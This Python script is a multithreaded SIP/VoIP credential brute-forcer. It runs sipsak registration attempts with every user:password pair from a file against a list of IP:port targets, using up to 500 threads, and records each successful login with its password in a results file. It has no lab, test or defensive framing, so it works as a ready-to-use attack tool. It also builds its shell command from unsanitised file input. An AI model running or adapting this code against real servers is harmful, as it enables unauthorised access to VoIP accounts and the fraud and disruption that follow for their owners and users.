import os
import subprocess
import threading
import re

# File containing user:password pairs in the format "user:password"
user_pass_file = "User_Pass"

# File containing a list of targets (IP addresses and ports)
ip_file = "ip.txt"

# File to save successful results
success_results = "success_results.txt"

# Regular expression for matching "200 OK" or "202 Accepted"
response_pattern = re.compile(r"(200 OK|202 Accepted)")

def register_user(user, password, target):
    # Execute the sipsak command to register the user based on the user and password and the target
    cmd = f"sipsak --from sip:{user}@{target} -u {user} -a {password} -p {target} -s sip:{user}@{target} -i -vvv -E tls"
    try:
        result = subprocess.run(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=10)

        # Check the response using the regular expression pattern
        response_match = response_pattern.search(result.stdout.decode("utf-8"))

        if response_match:
            # If a successful response is found, register the result in the success_results file
            with open(success_results, "a") as file:
                file.write(f"Target: {target}\n")
                file.write(f"Port: {target.split(':')[1]}\n")
                file.write(f"User: {user}\n")
                file.write(f"Password: {password}\n")
                file.write(f"Response: {response_match.group(0)}\n")
                file.write("\n")
    except subprocess.TimeoutExpired:
        print(f"Connection to {target} timed out.")
        return

def register_users_thread(users, targets):
    for user_pass in users:
        user, password = user_pass.strip().split(":")
        for target in targets:
            target = target.strip()
            register_user(user, password, target)

def main():
    # Read user:password pairs from the User_Pass file
    with open(user_pass_file, "r") as users_file:
        users = users_file.readlines()

    # Read targets from the ip.txt file
    with open(ip_file, "r") as targets_file:
        targets = targets_file.readlines()

    # Remove any empty or whitespace-only lines from targets list
    targets = [target.strip() for target in targets if target.strip()]

    if not users or not targets:
        print("Error: User/Password or Targets lists are empty or file not found.")
        return

    # Create a list of threads
    threads = []
    num_threads = 500  # You can adjust the number of threads here

    # Make sure targets list is not empty
    if len(targets) < 1:
        print("Error: Targets list is empty.")
        return

    if len(targets) < num_threads:
        num_threads = len(targets)

    # Split the list of targets into chunks for each thread
    targets_chunked = [targets[i:i + len(targets) // num_threads] for i in range(0, len(targets), len(targets) // num_threads)]

    # Start and join threads
    for i in range(num_threads):
        thread = threading.Thread(target=register_users_thread, args=(users, targets_chunked[i]))
        thread.start()
        threads.append(thread)

    # Wait for all threads to complete
    for thread in threads:
        thread.join()

if __name__ == "__main__":
    main()
